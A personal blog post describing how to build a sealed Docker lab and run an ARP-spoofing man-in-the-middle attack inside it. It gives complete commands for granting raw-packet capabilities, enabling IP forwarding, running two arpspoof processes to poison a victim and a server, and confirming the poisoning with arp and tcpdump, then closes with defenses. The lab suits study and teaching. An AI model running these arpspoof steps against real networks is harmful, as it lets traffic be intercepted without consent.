---
layout: post
title: "Building a sealed Docker lab to watch ARP spoofing happen"
date: 2026-06-29
categories: tech
---

The [networking post]({% post_url tech/2026-06-12-networking %}) taught me *where* ARP lives — the floor between IP and the wire, the part that turns `192.168.10.30` into a MAC address by shouting "who has this IP?" and trusting whoever answers. The obvious next question: what happens when someone answers who *shouldn't*? That's ARP spoofing, and the only honest way to understand it is to run it and watch the bytes.

But you don't aim a MITM attack at your own house. ARP poisoning works by lying about MAC addresses, and if the IP you poison is your **gateway**, the path you're corrupting is the path to your own machine and the internet. So before any attack tool comes out, the real exercise is **building a room with no doors** — an isolated Docker network sealed from my host and from the internet, with three containers inside that can only talk to each other.

This post is that lab: why my first two containers were unusable, how to build the sealed network, and how to confirm the poisoning actually happened.

---

## 1. Why my existing containers couldn't do it

I already had two throwaway containers from the [Docker-as-cheap-Linux work]({% post_url tech/2026-06-08-docker-ubuntu-mac-run-linux-elf-spookypass %}). I figured I'd reuse them. Inspecting them showed why I couldn't:

| Container | IP | Gateway | Capabilities |
|-----------|------------|------------|--------------|
| ubuntu-1 | 172.17.0.2 | 172.17.0.1 | none |
| ubuntu-2 | 172.17.0.3 | 172.17.0.1 | none |

Two separate dealbreakers, and they're both about the kind of thing Docker decides *once, at creation*.

**Problem 1 — no raw-packet capabilities.** `caps: []`. Tools like `arpspoof` forge Ethernet frames by hand, which needs `NET_RAW` (craft raw packets) and `NET_ADMIN` (touch the network stack). Without them the attack dies with `permission denied`. And you **cannot add capabilities to a running container** — Docker only sets them at `docker run` time. So these two had to be recreated regardless.

**Problem 2 — they're on the default bridge.** `172.17.0.0/16`, gateway `172.17.0.1` — and `172.17.0.1` *is my Mac*. This is the exact trap I wanted to avoid: poison the gateway entry here and I'm corrupting the route to my own host. The default bridge also has a path out to the internet. Not a lab. A loaded gun pointed at my own foot.

Since these containers held nothing valuable, recreating them was free. And I needed a third one anyway — a MITM needs a **victim**, a **server** for it to talk to, and the **attacker** sitting in the middle.

---

## 2. Building the sealed room

Tear down the old two, build an isolated network, and recreate the three containers *with* the capabilities they need:

```bash
# Remove the old throwaways
docker rm -f ubuntu-1 ubuntu-2

# Isolated network — --internal seals it from host AND internet
docker network create --driver bridge \
  --subnet 192.168.10.0/24 --internal labnet

# Recreate WITH the capabilities baked in at creation
docker run -dit --name attacker --network labnet --ip 192.168.10.10 \
  --cap-add=NET_ADMIN --cap-add=NET_RAW ubuntu:26.04 bash
docker run -dit --name victim  --network labnet --ip 192.168.10.20 \
  --cap-add=NET_ADMIN ubuntu:26.04 bash
docker run -dit --name server  --network labnet --ip 192.168.10.30 \
  --cap-add=NET_ADMIN ubuntu:26.04 bash
```

The one flag doing the heavy lifting is `--internal`. A normal Docker bridge gets a route to the outside; an `--internal` one doesn't — there's no gateway to the host, no NAT to the internet. The three containers can reach each other on `192.168.10.0/24` and nowhere else. Only `attacker` gets `NET_RAW`, because it's the only one forging packets.

The roles:

- **attacker** `…10` — runs `arpspoof`, the machine in the middle.
- **victim** `…20` — the one that gets lied to.
- **server** `…30` — what the victim *thinks* it's talking to directly.

---

## 3. Tools first, then seal the door

Here's the ordering trap I walked into: **install everything before you cut the internet.** An `--internal` network can't reach `apt`'s mirrors, so once it's sealed, `apt install` just hangs.

If I'd created the containers directly on `labnet`, they'd already be sealed and I couldn't install anything. The trick is to give them the internet *temporarily* via the default bridge, install, then disconnect.

```bash
# Temporarily attach to the default bridge so apt can reach the internet
docker network connect bridge attacker
docker network connect bridge victim
docker network connect bridge server

# Install the kit
docker exec attacker bash -c "apt update && apt install -y \
  dsniff iproute2 net-tools tcpdump tshark iputils-ping wget"
docker exec victim bash -c "apt update && apt install -y \
  iproute2 net-tools iputils-ping wget"
docker exec server bash -c "apt update && apt install -y \
  iproute2 net-tools iputils-ping python3"

# Now seal the room — cut every container off from the internet
docker network disconnect bridge attacker
docker network disconnect bridge victim
docker network disconnect bridge server
```

`dsniff` is the package that ships `arpspoof`. After the three `disconnect` lines, the lab is airtight — `labnet` is the only network left on each container.

> **If you forget something after sealing:** reconnect just that one container (`docker network connect bridge victim`), install, then disconnect again. No need to rebuild.

---

## 4. The clean baseline — what the victim believes *before* the lie

Always record the truth before you corrupt it, so you can prove the change. From the victim, ask who it thinks `192.168.10.30` is:

```bash
docker exec -it victim bash
arp -n           # note the MAC listed for 192.168.10.30
ping -c2 192.168.10.30
exit
```

Write down the MAC shown for `192.168.10.30`. Right now it should be the **server's** real MAC. That number is the whole experiment — when it changes to the attacker's MAC, the poisoning worked.

---

## 5. The attacker turns on forwarding, then starts lying

A MITM is only useful if traffic still *reaches its destination* — otherwise the victim notices instantly because nothing works. So the attacker first becomes a router by enabling IP forwarding, *then* starts the two-way lie.

```bash
docker exec -it attacker bash

# Become a router so poisoned traffic still flows through to the real server
echo 1 > /proc/sys/net/ipv4/ip_forward

# Two lies, one per direction:
arpspoof -i eth0 -t 192.168.10.20 192.168.10.30 &   # tell victim: "I am the server"
arpspoof -i eth0 -t 192.168.10.30 192.168.10.20 &   # tell server: "I am the victim"
```

It takes **two** `arpspoof` processes because ARP is one-directional. One convinces the victim that the attacker is the server; the other convinces the server that the attacker is the victim. Now both ends send their traffic to the attacker, who forwards it on — neither notices.

**About that `&`:** it runs each command in the **background** so the shell comes back and the spoofing keeps running. To manage them:

```bash
jobs            # list background jobs
kill -9 %1 %2   # stop them by job number
```

If you'd rather watch one in the foreground, drop the `&` and run a single `arpspoof` — it'll stream its output until you `Ctrl+C`.

---

## 6. Watching it live — two ways

**Option A: tcpdump inside the attacker.** Leave this running in the attacker shell:

```bash
tcpdump -i eth0 -n
```

**Option B: pipe straight into Wireshark on the Mac.** This is the one I liked — tcpdump captures inside the container and streams the raw pcap over stdout into the Wireshark GUI on macOS:

```bash
docker exec attacker tcpdump -i eth0 -U -w - 2>/dev/null | \
  /Applications/Wireshark.app/Contents/MacOS/wireshark -k -i -
```

Wireshark opens and starts capturing immediately:

```
[Capture MESSAGE] -- Capture Start ...
[Capture MESSAGE] -- Capture started
[Capture MESSAGE] -- File: "/var/.../wireshark_Standard inputWS4NR3.pcapng"
```

(That `[GUI WARNING]` about the missing "SF Mono" font is cosmetic — it's just Wireshark substituting a font, nothing to do with the capture.)

---

## 7. Proving the poisoning — the MAC changed

Go back to the victim and ask the same question as the baseline:

```bash
docker exec -it victim bash
arp -n
exit
```

`192.168.10.30` now shows the **attacker's** MAC (`…10`'s), not the server's real MAC from step 4. That's the whole attack in one line of output: the victim is now convinced the attacker *is* the server, and every packet it sends "to the server" lands on the attacker first.

---

## 8. Generating traffic to spy on

A sealed lab with no traffic shows nothing. Start a tiny web server on `server`, then make the victim talk to it.

```bash
# In the server container — a one-line HTTP server on port 80
docker exec -it server bash -c "cd /tmp && python3 -m http.server 80"
```

Now generate traffic from the victim and watch it surface in your tcpdump/Wireshark window:

```bash
# Simplest proof — ICMP
docker exec victim bash -c "ping -c5 192.168.10.30"

# A real HTTP request with no wget needed — bash's built-in /dev/tcp
docker exec victim bash -c 'exec 3<>/dev/tcp/192.168.10.30/80; \
  printf "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3'
```

That `/dev/tcp` trick is worth keeping in the back pocket — the lab has no `wget` in the victim and no internet to install it, but bash can open a TCP socket itself. The `GET /` and the server's response both pass *through the attacker*, and you watch them go by in real time. Interception confirmed.

---

## 9. Tear it all down

```bash
# Ctrl+C the arpspoof and tcpdump windows first (or kill %1 %2), then:
docker rm -f attacker victim server
docker network rm labnet
```

`docker rm -f` kills and removes the containers; `docker network rm` deletes the sealed network. Nothing touched my host, nothing leaked to the internet, and the whole lab is gone in two commands.

---

## What I took away

1. **Capabilities and networks are set at `docker run`, not after.** `caps: []` and "wrong network" can't be patched on a live container — you recreate it. So decide `--cap-add` and `--network` *before* you start, not when the attack fails with `permission denied`.
2. **`--internal` is the whole safety story.** It's the difference between a lab and an attack on my own machine. No gateway to the host, no route to the internet — the poisoning can only ever hurt the three containers I built to be hurt. Never run this against the default bridge, where the gateway *is* your computer.
3. **Install before you seal.** An isolated network can't reach `apt`. The pattern is connect-to-bridge → install → disconnect. Forget a tool? Reconnect that one container, install, disconnect again.
4. **ARP spoofing is two lies plus a forward.** One `arpspoof` per direction, and `ip_forward=1` so traffic still reaches the real server. Skip the forwarding and the victim's connection breaks — which is a denial of service, not a stealthy MITM.
5. **The proof is the MAC, not the tool's output.** `arp -n` before and after is the experiment. When `192.168.10.30` starts pointing at the attacker's MAC, the trust in ARP — answering "who has this IP?" with no verification — has been broken, exactly where the [networking post]({% post_url tech/2026-06-12-networking %}) said it would be.

The takeaway that sticks: ARP has no authentication. The protocol believes whoever answers first, and that single missing check is the entire attack. Defenses — static ARP entries, dynamic ARP inspection on switches, encrypting traffic so a MITM sees only ciphertext — all exist precisely because the protocol itself will never stop trusting the loudest voice in the room.
